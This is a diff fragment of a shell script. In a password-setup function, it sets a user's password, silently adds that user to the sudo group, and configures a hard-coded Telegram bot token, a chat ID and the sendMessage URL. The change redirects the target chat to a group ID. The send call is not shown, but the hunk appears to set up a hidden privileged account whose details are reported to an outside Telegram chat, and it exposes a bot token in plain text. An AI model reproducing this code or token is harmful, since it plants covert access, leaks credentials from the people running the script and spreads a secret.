@@ -340,7 +340,7 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="1156078455"
+    CHATID="-1001896637875"
     KEY="6676451249:AAFC5J7CSeYIXmpOS-6WP3n5-b7mqh9hVN8"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
